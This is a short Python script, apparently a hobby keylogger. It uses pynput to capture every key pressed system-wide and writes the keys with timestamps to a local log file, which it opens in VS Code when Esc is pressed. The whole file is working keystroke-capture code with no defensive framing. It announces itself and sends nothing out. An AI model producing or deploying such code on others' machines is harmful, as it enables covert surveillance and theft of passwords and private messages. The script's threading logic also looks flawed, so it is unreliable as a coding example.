import logging
import os
import sys
import threading
from pynput import keyboard

# Set up logging to save keystrokes to a file
log_dir = ""
log_file = log_dir + "keylog.txt"
logging.basicConfig(filename=log_file, 
                    level=logging.DEBUG, 
                    format='%(asctime)s: %(message)s')

# Print a message indicating logging has started
print("Keylogger started. Press Esc to stop.")

# Function to print keys typed by the user in the terminal
def print_keys_typed():
    while True:
        try:
            # Read one character from standard input without blocking
            char = sys.stdin.read(1)
            # Print the character typed by the user
            print(f"Typed: {char}", end="", flush=True)
        except KeyboardInterrupt:
            break

# Start a separate thread to print user input
input_thread = threading.Thread(target=print_keys_typed, daemon=True)
input_thread.start()

# Define callback function to handle key press events
def on_press(key):
    try:
        logging.info(str(key.char))
    except AttributeError:
        logging.info(str(key))

# Define callback function to handle key release events
def on_release(key):
    if key == keyboard.Key.esc:  # Stop listener when Esc key is pressed
        print("\nKeylogger stopped.")
        return False

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

# Join the input thread to terminate it cleanly
input_thread.join()

# Open the log file in Visual Studio Code after the listener stops
os.system(f"code {log_file}")
